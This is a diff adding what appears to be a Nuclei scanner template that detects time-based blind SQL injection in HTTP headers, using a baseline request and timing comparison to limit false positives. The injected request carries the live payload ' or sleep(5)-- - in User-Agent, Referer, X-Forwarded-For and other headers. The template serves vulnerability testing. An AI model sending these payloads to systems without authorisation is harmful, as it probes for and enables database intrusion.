@@ -1,0 +1,73 @@
+id: header-blind-sql-injection
+info:
+  name: Header Blind SQL Injection
+  author: geeknik
+  severity: high
+  description: |
+    Time-based blind SQL injection via HTTP headers. Sends a baseline request
+    first, then injects sleep payloads into headers commonly logged or processed
+    in database queries. Compares response times to reduce false positives from
+    slow servers or network latency.
+  tags: blind-sqli
+
+http:
+  # Request 1: baseline — no injection, measure normal response time
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+          - 404
+          - 500
+        internal: true
+
+    extractors:
+      - type: dsl
+        name: baseline_duration
+        dsl:
+          - "duration"
+        internal: true
+
+  # Request 2: inject sleep(5) into headers commonly reflected in DB queries.
+  # Only targets headers that applications realistically log, parse, or use
+  # in SQL lookups (user-agent logging, IP-based access control, etc.).
+  # Avoids Content-Length, Connection, Accept-Encoding which break HTTP semantics.
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ' or sleep(5)-- -
+        Referer: ' or sleep(5)-- -
+        X-Forwarded-For: ' or sleep(5)-- -
+        X-Client-IP: ' or sleep(5)-- -
+        X-Remote-IP: ' or sleep(5)-- -
+        X-Remote-Addr: ' or sleep(5)-- -
+        X-Originating-IP: ' or sleep(5)-- -
+        X-Forwarded-Host: ' or sleep(5)-- -
+        X-Host: ' or sleep(5)-- -
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      # Injected request took at least 5 seconds total
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      # Injected request took at least 4 seconds longer than baseline,
+      # ruling out slow servers and high-latency networks
+      - type: dsl
+        dsl:
+          - "duration >= 4 + baseline_duration"
